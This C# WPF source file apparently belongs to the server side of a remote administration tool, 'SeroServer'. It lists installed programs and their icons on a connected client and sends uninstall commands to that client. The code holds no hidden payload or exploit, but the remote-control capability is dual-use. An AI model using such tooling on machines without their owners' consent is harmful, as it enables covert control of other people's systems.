using System.Collections.ObjectModel;
using System.ComponentModel;
using System.Runtime.CompilerServices;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Media;
using System.Windows.Threading;
using DevExpress.Xpf.Core;
using Newtonsoft.Json;
using SeroServer.Net;
using SeroServer.Protocol;

namespace SeroServer.UI;

public class InstalledAppVM : INotifyPropertyChanged
{
    public event PropertyChangedEventHandler? PropertyChanged;
    private void N([CallerMemberName] string? p = null) => PropertyChanged?.Invoke(this, new PropertyChangedEventArgs(p));

    private System.Windows.Media.ImageSource? _icon;
    public System.Windows.Media.ImageSource? Icon { get => _icon; set { if (!ReferenceEquals(_icon, value)) { _icon = value; N(); } } }

    public string Name            { get; set; } = "";
    public string Version         { get; set; } = "";
    public string Publisher       { get; set; } = "";
    public string InstallDate     { get; set; } = "";
    public string UninstallString { get; set; } = "";
    public bool   Verified        { get; set; } = false;
    public string PublisherDisplay => Verified
        ? (string.IsNullOrEmpty(Publisher) ? "Verified" : Publisher)
        : (string.IsNullOrEmpty(Publisher) ? "Unknown"  : Publisher);
    public string VerifiedDisplay => Verified ? "✓" : "✗";
}

public partial class InstalledAppsWindow : ThemedWindow
{
    private readonly TlsServer _server;
    private readonly string    _clientId;
    private readonly ObservableCollection<InstalledAppVM> _all  = [];
    private          ObservableCollection<InstalledAppVM> _view = [];
    private readonly Dictionary<string, InstalledAppVM>   _allByName = new(StringComparer.OrdinalIgnoreCase);
    private readonly HashSet<string> _iconPending = [];
    private CancellationTokenSource _iconCts = new();
    private bool _disconnected = false;

    public InstalledAppsWindow(TlsServer server, string clientId, string label)
    {
        InitializeComponent();
        RubberBandSelector.Enable(GridApps);
        TypeToSelect.Enable(GridApps, o => (o as InstalledAppVM)?.Name ?? "");
        _server   = server;
        _clientId = clientId;
        TxtTitle.Text = label;
        GridApps.ItemsSource = _view;

        _server.RegisterHandler(clientId, PacketType.InstalledListResult, OnList);
        _server.RegisterHandler(clientId, PacketType.InstalledIconResult, OnIcon);
        _server.ClientDisconnected += OnClientDisconnected;

        Lang.LanguageChanged += ApplyLanguage;
        ApplyLanguage();
        Closed += (_, _) =>
        {
            _iconCts.Cancel();
            _server.UnregisterHandler(clientId, PacketType.InstalledListResult);
            _server.UnregisterHandler(clientId, PacketType.InstalledIconResult);
            _server.ClientDisconnected -= OnClientDisconnected;
            Lang.LanguageChanged -= ApplyLanguage;
        };
        Refresh();
    }

    private void ApplyLanguage()
    {
        Title = Lang.Get("FEAT_INSTALLED_APPS");
        if (MnuAppUninstall     != null) MnuAppUninstall.Header     = Lang.Get("ACT_UNINSTALL");
        if (MnuAppCopyName      != null) MnuAppCopyName.Header      = Lang.Get("ACT_COPY_NAME");
        if (MnuAppCopyPublisher != null) MnuAppCopyPublisher.Header = Lang.Get("ACT_COPY_PUBLISHER");
        if (MnuAppRefresh       != null) MnuAppRefresh.Header       = Lang.Get("ACT_REFRESH");
        if (ColAppName      != null) ColAppName.Header      = Lang.Get("WIN_COL_NAME");
        if (ColAppVersion   != null) ColAppVersion.Header   = Lang.Get("WIN_COL_VERSION");
        if (ColAppPublisher != null) ColAppPublisher.Header = Lang.Get("WIN_COL_PUBLISHER");
        if (ColAppInstDate  != null) ColAppInstDate.Header  = Lang.Get("WIN_COL_INSTALL_DATE");
    }

    private void Refresh()
    {
        if (_disconnected) return;
        TxtStatus.Text = Lang.Get("STATUS_REFRESHING");
        _ = _server.SendToClient(_clientId, new Packet { Type = PacketType.InstalledGetList });
    }

    private void OnList(Packet pkt)
    {
        try
        {
            var d = JsonConvert.DeserializeObject<InstalledListResultData>(pkt.Data);
            if (d == null) return;

            // Cancel any in-flight icon request loop from a previous refresh (Cancel is thread-safe)
            _iconCts.Cancel();

            Dispatcher.BeginInvoke(DispatcherPriority.Background, () =>
            {
                // Create new CTS on UI thread so reads from Closed/OnClientDisconnected don't race
                _iconCts = new CancellationTokenSource();
                var cts = _iconCts;

                _all.Clear();
                _allByName.Clear();
                lock (_iconPending) _iconPending.Clear();
                foreach (var a in d.Apps)
                {
                    var vm = new InstalledAppVM
                    {
                        Name            = a.Name,
                        Version         = a.Version,
                        Publisher       = a.Publisher,
                        InstallDate     = FormatInstallDate(a.InstallDate),
                        UninstallString = a.UninstallString,
                        Verified        = a.Verified
                    };
                    _all.Add(vm);
                    _allByName[a.Name] = vm;
                }
                ApplyFilter(TxtSearch.Text);
                TxtCount.Text  = $"({d.Apps.Count})";
                TxtStatus.Text = string.Format(Lang.Get("INS_UPDATED"), DateTime.Now.ToString("HH:mm:ss"), d.Apps.Count);
                _ = RequestIconsAsync(d.Apps, cts.Token);
            });
        }
        catch { }
    }

    private async Task RequestIconsAsync(List<InstalledApp> apps, CancellationToken ct)
    {
        foreach (var a in apps)
        {
            if (ct.IsCancellationRequested) return;
            if (string.IsNullOrEmpty(a.Name)) continue;
            lock (_iconPending)
            {
                if (!_iconPending.Add(a.Name)) continue;
            }
            await _server.SendToClient(_clientId, new Packet
            {
                Type = PacketType.InstalledGetIcon,
                Data = JsonConvert.SerializeObject(new InstalledIconRequestData { Name = a.Name })
            });
            await Task.Delay(30, CancellationToken.None);
        }
    }

    private void OnIcon(Packet pkt)
    {
        try
        {
            var d = JsonConvert.DeserializeObject<InstalledIconResultData>(pkt.Data);
            if (d == null || string.IsNullOrEmpty(d.Name) || string.IsNullOrEmpty(d.IconB64)) return;
            var name = d.Name;
            var b64  = d.IconB64;
            // Decode on UI (STA) thread — BitmapImage requires STA, not safe on packet handler thread
            Dispatcher.BeginInvoke(DispatcherPriority.Background, () =>
            {
                var icon = DecodeIcon(b64);
                if (icon == null) return;
                if (_allByName.TryGetValue(name, out var vm))
                    vm.Icon = icon;
            });
        }
        catch { }
    }

    private void ApplyFilter(string f)
    {
        _view = string.IsNullOrWhiteSpace(f)
            ? _all
            : new ObservableCollection<InstalledAppVM>(_all.Where(a =>
                a.Name.Contains(f, StringComparison.OrdinalIgnoreCase) ||
                a.Publisher.Contains(f, StringComparison.OrdinalIgnoreCase)));
        GridApps.ItemsSource = _view;
    }

    private void TxtSearch_Changed(object s, TextChangedEventArgs e) => ApplyFilter(TxtSearch.Text);

    private void BtnUninstall_Click(object s, RoutedEventArgs e)
    {
        if (_disconnected) return;
        var sel = GridApps.SelectedItems.Cast<InstalledAppVM>().Where(v => !string.IsNullOrEmpty(v.UninstallString)).ToList();
        if (sel.Count == 0) return;
        string msg = sel.Count == 1
            ? string.Format(Lang.Get("INS_UNINSTALL_1"), sel[0].Name)
            : string.Format(Lang.Get("INS_UNINSTALL_N"), sel.Count);
        if (MessageBox.Show(msg, Lang.Get("MSG_CONFIRM"), MessageBoxButton.YesNo, MessageBoxImage.Warning) != MessageBoxResult.Yes) return;
        foreach (var vm in sel)
            _ = _server.SendToClient(_clientId, new Packet { Type = PacketType.InstalledUninstall, Data = JsonConvert.SerializeObject(new InstalledUninstallData { UninstallString = vm.UninstallString }) });
        TxtStatus.Text = sel.Count == 1 ? $"Uninstall → {sel[0].Name}" : $"Uninstall → {sel.Count} apps";
        ServerWindow.ReportGlobalActivity("Uninstall app", sel.Count == 1 ? sel[0].Name : $"{sel.Count} apps", "complete");
        ServerWindow.LogGlobal($"[APPS] Sent uninstall command for {(sel.Count == 1 ? $"app '{sel[0].Name}'" : $"{sel.Count} apps")} on client {_clientId}.");
    }

    private void OnClientDisconnected(SeroServer.Data.ConnectedClient c)
    {
        if (c.Id != _clientId) return;
        Dispatcher.BeginInvoke(() =>
        {
            _disconnected = true;
            _iconCts.Cancel();
            TxtStatus.Text       = Lang.Get("PM_DISCONNECTED");
            TxtStatus.Foreground = new SolidColorBrush(Color.FromRgb(0xF5, 0x9E, 0x0B));
            GridApps.Opacity     = 0.55;
        });
    }

    private void BtnRefresh_Click(object s, RoutedEventArgs e)
    {
        _iconCts.Cancel();
        Refresh();
    }

    private void GridApps_CopyName_Click(object s, RoutedEventArgs e)
    {
        if (GridApps.SelectedItem is InstalledAppVM vm)
            try { System.Windows.Clipboard.SetText(vm.Name); TxtStatus.Text = string.Format(Lang.Get("COPIED"), vm.Name); } catch { }
    }

    private void GridApps_CopyPublisher_Click(object s, RoutedEventArgs e)
    {
        if (GridApps.SelectedItem is InstalledAppVM vm && !string.IsNullOrEmpty(vm.Publisher))
            try { System.Windows.Clipboard.SetText(vm.Publisher); TxtStatus.Text = string.Format(Lang.Get("COPIED"), vm.Publisher); } catch { }
    }

    private void GridApps_ContextMenuOpening(object sender, System.Windows.Controls.ContextMenuEventArgs e)
    {
        if (GridApps.SelectedItem == null) e.Handled = true;
    }

    private static string FormatInstallDate(string raw)
    {
        if (raw.Length == 8 && raw.All(char.IsDigit) &&
            DateTime.TryParseExact(raw, "yyyyMMdd", null,
                System.Globalization.DateTimeStyles.None, out var dt))
            return dt.ToString("yyyy-MM-dd");
        return raw;
    }

    private static System.Windows.Media.ImageSource? DecodeIcon(string b64) => UiHelpers.DecodeIcon(b64);
}
